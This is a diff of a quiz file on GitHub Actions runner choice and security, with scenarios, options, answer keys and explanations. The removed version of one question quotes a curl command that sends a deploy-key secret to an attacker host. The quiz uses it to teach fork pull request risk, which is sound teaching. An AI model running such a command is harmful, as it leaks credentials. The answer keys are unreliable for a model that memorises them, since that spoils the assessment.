@@ -4,80 +4,170 @@
     {
       "id": "q1",
       "type": "single",
-      "scenario": "A developer creates a file at `/tmp/build-cache.tar.gz` during a workflow run. Ten minutes later, a new push triggers another run on the same repository. The developer's step tries to read `/tmp/build-cache.tar.gz` but gets a \"file not found\" error. What is the explanation?",
+      "scenario": "A job starts on ubuntu-latest and immediately runs npm test. The log says package.json does not exist, although the file is present at the repository root. The workflow has no earlier steps. What is missing?",
       "options": [
-        { "id": "a", "text": "GitHub-hosted runners are ephemeral. Each job gets a fresh VM that is destroyed after the run. Files from a previous run do not persist." },
-        { "id": "b", "text": "The `/tmp` directory is cleared between steps, but files in the home directory persist." },
-        { "id": "c", "text": "The runner reuses the same VM but resets the filesystem to a clean snapshot." },
-        { "id": "d", "text": "Files in `/tmp` are automatically deleted after 5 minutes by a cron job on the runner." }
+        {
+          "id": "a",
+          "text": "A job-level `defaults.run.working-directory` value that points to the repository root."
+        },
+        {
+          "id": "b",
+          "text": "An artifact download from the workflow's build job so the workspace contains the source tree."
+        },
+        {
+          "id": "c",
+          "text": "A checkout action that places the repository in the job workspace."
+        },
+        {
+          "id": "d",
+          "text": "A reusable workflow that performs checkout before invoking the current test job."
+        }
       ],
-      "correct": ["a"],
-      "explanation": "GitHub-hosted runners provision a completely new virtual machine for every job. When the job finishes, the VM is destroyed. Nothing persists between runs. To share files across runs, use `actions/cache` or `actions/upload-artifact`. Option C is wrong because the VM is fully destroyed, not snapshotted."
+      "correct": [
+        "c"
+      ],
+      "explanation": "A runner receives job instructions, not an automatic copy of the repository. Checkout must populate `GITHUB_WORKSPACE` in this job before project commands can read `package.json`. A working-directory value only changes where commands look. Artifacts are not the normal source checkout, and a separate reusable-workflow job cannot populate this job's workspace. See [GitHub-hosted runners](https://docs.github.com/en/actions/how-tos/manage-runners/github-hosted-runners/use-github-hosted-runners)."
     },
     {
       "id": "q2",
       "type": "single",
-      "scenario": "A workflow has this job:\n\n```yaml\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n```\n\nThe `npm test` step fails with `npm: command not found`. The developer is confused because `ubuntu-latest` should have Node.js pre-installed. What is the most likely root cause?",
+      "scenario": "A repository policy requires pull request checks to remain on GitHub-hosted runners. In that job, `npm ci` fails while compiling a PostgreSQL native module, and the log names a missing libpq header. Developers do not reproduce the failure because their laptops already have PostgreSQL development packages. What is the most reliable workflow fix?",
       "options": [
-        { "id": "a", "text": "The job is missing `actions/checkout@v4` as the first step." },
-        { "id": "b", "text": "The runner image may not include the specific Node.js version needed. The developer should use `actions/setup-node@v4` to install and configure the correct version." },
-        { "id": "c", "text": "`ubuntu-latest` does not come with any programming language runtimes pre-installed." },
-        { "id": "d", "text": "The `runs-on` value should be `node-latest` instead of `ubuntu-latest`." }
+        {
+          "id": "a",
+          "text": "Install the missing OS package before npm ci and pin the runtime with a setup action."
+        },
+        {
+          "id": "b",
+          "text": "Run `npm ci` in a Node container whose image tag matches the developer laptops."
+        },
+        {
+          "id": "c",
+          "text": "Cache the compiled native module from a successful Linux run and restore it before `npm ci`."
+        },
+        {
+          "id": "d",
+          "text": "Move the job to a maintained self-hosted image that already contains libpq, without adding an explicit setup step."
+        }
       ],
-      "correct": ["b"],
-      "explanation": "While Ubuntu runner images include some versions of Node.js, the pre-installed version may not match what the project needs. `actions/setup-node@v4` installs a specific version and adds it to `PATH`. Option C is wrong because the runner images do include many runtimes, but using setup actions gives you control over exact versions. Option D is wrong because there is no `node-latest` runner label."
+      "correct": [
+        "a"
+      ],
+      "explanation": "CI should declare both the OS library and language runtime before dependency installation. A generic Node container may still lack libpq headers. Restoring a compiled native module risks an ABI mismatch, while an undocumented self-hosted image hides the dependency instead of making the build reproducible. See [Customizing GitHub-hosted runners](https://docs.github.com/en/actions/how-tos/manage-runners/github-hosted-runners/customize-runners)."
     },
     {
       "id": "q3",
       "type": "single",
-      "scenario": "An organization attaches a self-hosted runner to a **public** repository. An external contributor forks the repository, adds `run: curl http://attacker.com/exfil?token=${{ secrets.DEPLOY_KEY }}` to the workflow file, and opens a Pull Request. What is the primary risk?",
+      "scenario": "Integration tests must reach a database at a private VPC address and use a licensed test tool installed on controlled machines. Pull request unit tests need neither capability. Which runner split best limits access?",
       "options": [
-        { "id": "a", "text": "The attacker gains Remote Code Execution on the self-hosted runner machine, which may be inside the organization's private network." },
-        { "id": "b", "text": "The attacker can read all repository secrets because fork PRs always have secret access." },
-        { "id": "c", "text": "The attacker can merge the PR without approval because the runner has admin access." },
-        { "id": "d", "text": "There is no risk because GitHub strips all secrets from fork PR workflow runs." }
+        {
+          "id": "a",
+          "text": "Run unit and integration jobs on the private pool, but isolate deployments on a second self-hosted runner group."
+        },
+        {
+          "id": "b",
+          "text": "Use hosted runners for every job and establish a temporary VPN tunnel to the VPC for integration tests."
+        },
+        {
+          "id": "c",
+          "text": "Package the licensed tool as an encrypted artifact and download it on hosted runners for the integration job."
+        },
+        {
+          "id": "d",
+          "text": "Use hosted runners for ordinary checks and a narrowly labeled self-hosted pool only for the integration job."
+        }
       ],
-      "correct": ["a"],
-      "explanation": "Self-hosted runners trust the code they execute. If a public repo allows fork PRs to trigger workflows on a self-hosted runner, the attacker can run arbitrary commands on that machine. This is especially dangerous because self-hosted runners often sit inside corporate networks with access to internal services. Option D is partially true for secrets (GitHub does strip them on fork PRs by default), but the runner itself is still compromised because the attacker controls the script."
+      "correct": [
+        "d"
+      ],
+      "explanation": "The integration job has explicit private-network and licensed-tool requirements, while ordinary checks do not. Sending unit tests into the private pool broadens code exposure. A VPN could solve reachability but not licensed-tool handling, and distributing the licensed binary may violate security and licensing constraints. See [GitHub self-hosted runners](https://docs.github.com/en/actions/concepts/runners/self-hosted-runners)."
     },
     {
       "id": "q4",
       "type": "single",
-      "scenario": "A team debates whether to use GitHub-hosted runners or self-hosted runners for their CI pipeline. Their build requires access to a private database server at `10.0.1.50:5432` inside their VPC. Which is the strongest argument for using self-hosted runners?",
+      "scenario": "A public repository allows fork pull requests to execute on a long-lived self-hosted runner inside the corporate network. Fork workflows receive no production secrets. What is still the primary risk?",
       "options": [
-        { "id": "a", "text": "Self-hosted runners are faster because they have better hardware." },
-        { "id": "b", "text": "Self-hosted runners can be placed inside the private network, giving them direct access to internal resources like the database. GitHub-hosted runners run on GitHub's infrastructure and cannot reach private VPC addresses by default." },
-        { "id": "c", "text": "GitHub-hosted runners do not support Linux operating systems." },
-        { "id": "d", "text": "Self-hosted runners are free, while GitHub-hosted runners always cost money." }
+        {
+          "id": "a",
+          "text": "The fork can change repository settings through the runner even when `GITHUB_TOKEN` has read-only permissions."
+        },
+        {
+          "id": "b",
+          "text": "Untrusted pull request code can execute commands on the organization's machine and probe resources the runner can reach."
+        },
+        {
+          "id": "c",
+          "text": "The fork can make GitHub-hosted jobs reuse the self-hosted runner's filesystem during later workflow runs."
+        },
+        {
+          "id": "d",
+          "text": "The fork can read production secrets only if the workflow references those secrets in the pull request job."
+        }
       ],
-      "correct": ["b"],
-      "explanation": "The primary advantage of self-hosted runners is network placement. They can be deployed inside your VPC, data center, or private network, giving them direct access to internal databases, registries, and APIs that GitHub-hosted runners cannot reach. Option A is sometimes true but is not the strongest argument. Option C is wrong. Option D is misleading because GitHub offers free minutes on hosted runners for public repos."
+      "correct": [
+        "b"
+      ],
+      "explanation": "The primary boundary failure is executing attacker-controlled commands on a persistent organization host with internal reachability. Workspace persistence is another serious risk, but it is one consequence of the broader host compromise. Withholding GitHub secrets does not remove local credentials, network paths, or machine identity. See [GitHub self-hosted runner security](https://docs.github.com/en/actions/concepts/runners/self-hosted-runners)."
     },
     {
       "id": "q5",
       "type": "single",
-      "scenario": "A workflow runs `npm test` but fails with `ENOENT: no such file or directory, open 'package.json'`. The `package.json` exists in the repository root. The developer checks the workflow:\n\n```yaml\nsteps:\n  - run: npm test\n```\n\nWhat is missing?",
+      "scenario": "The team wants Node commands to run inside `node:22-bookworm`, needs PostgreSQL beside the tests with an explicit health check, and wants to update the Node and database images independently. Which workflow shape matches those requirements?",
       "options": [
-        { "id": "a", "text": "The `actions/checkout@v4` step. Without it, the runner's workspace directory is empty because the repository code is not cloned onto the VM." },
-        { "id": "b", "text": "The `working-directory` key. The runner starts in the wrong directory by default." },
-        { "id": "c", "text": "The `npm ci` step. You must install dependencies before running tests." },
-        { "id": "d", "text": "The `package.json` must be committed to a branch named `main` for the runner to see it." }
+        {
+          "id": "a",
+          "text": "Use PostgreSQL as the job container and install Node inside that container before running the tests."
+        },
+        {
+          "id": "b",
+          "text": "Run Node in a job container and start PostgreSQL in a separate job whose address is exported as an output."
+        },
+        {
+          "id": "c",
+          "text": "Use node:22-bookworm as the job container and PostgreSQL as a service container with a health check."
+        },
+        {
+          "id": "d",
+          "text": "Run both Node and PostgreSQL in a custom combined image so the job has one container lifecycle."
+        }
       ],
-      "correct": ["a"],
-      "explanation": "The runner provisions a clean VM with an empty workspace. The `actions/checkout` action clones the repository into the workspace directory (`$GITHUB_WORKSPACE`). Without it, no source code exists on the runner. Option C would also cause a failure, but the error message specifically says `package.json` is missing, which points to checkout, not dependency installation."
+      "correct": [
+        "c"
+      ],
+      "explanation": "The job container supplies the Node execution environment, while a service container supplies PostgreSQL on the same job network with an independent health check. Using PostgreSQL as the main container makes application tooling setup awkward. A database in another job is not a durable service for this job, and a combined image couples two lifecycles. See [Running jobs in a container](https://docs.github.com/en/actions/how-tos/write-workflows/choose-where-workflows-run/run-jobs-in-a-container)."
     },
     {
       "id": "q6",
       "type": "multiple",
-      "scenario": "A team is hardening their self-hosted runner setup for a private repository. Which of the following measures reduce the attack surface while staying close to the article's guidance?",
+      "scenario": "The organization uses hosted runners for pull requests and private self-hosted runners for integration and deployment work. Which controls reduce risk across this mixed fleet?",
       "options": [
-        { "id": "a", "text": "Run the runner inside an ephemeral container or VM that is destroyed after each job." },
-        { "id": "b", "text": "Restrict the runner to private repositories only, never attach it to public repos." },
-        { "id": "c", "text": "Give the runner machine root-level access to the production database for convenience." },
-        { "id": "d", "text": "Use strict manual approval gates before untrusted pull requests can execute on the self-hosted runner." }
+        {
+          "id": "a",
+          "text": "Keep untrusted pull request checks on fresh hosted runners when private access is unnecessary."
+        },
+        {
+          "id": "b",
+          "text": "Allow pull request jobs onto private runners when they request only labels that omit the word `prod`."
+        },
+        {
+          "id": "c",
+          "text": "Give private jobs narrow labels that describe required network and tool capabilities."
+        },
+        {
+          "id": "d",
+          "text": "Reuse persistent self-hosted workspaces for trusted and untrusted jobs, but remove repository files after each run."
+        },
+        {
+          "id": "e",
+          "text": "Limit credentials and network access to the jobs and runner groups that need them."
+        }
       ],
-      "correct": ["a", "b", "d"],
-      "explanation": "The article's warning is that self-hosted runners execute code on infrastructure you own. Ephemeral machines reduce state leakage, private-only attachment avoids public-fork RCE, and strict manual approval gates are one of the advanced isolation controls the article names. Root database access expands the blast radius."
+      "correct": [
+        "a",
+        "c",
+        "e"
+      ],
+      "explanation": "Fresh hosted runners reduce persistent-machine risk for ordinary untrusted checks. Narrow labels, runner groups, and access scopes make sensitive placement explicit. Label names are routing metadata, not a trust control. Deleting repository files alone does not remove processes, caches, tools, or other persistence left by untrusted code. See [Choosing a runner](https://docs.github.com/en/actions/how-tos/write-workflows/choose-where-workflows-run/choose-the-runner-for-a-job)."
     }
   ]
 }
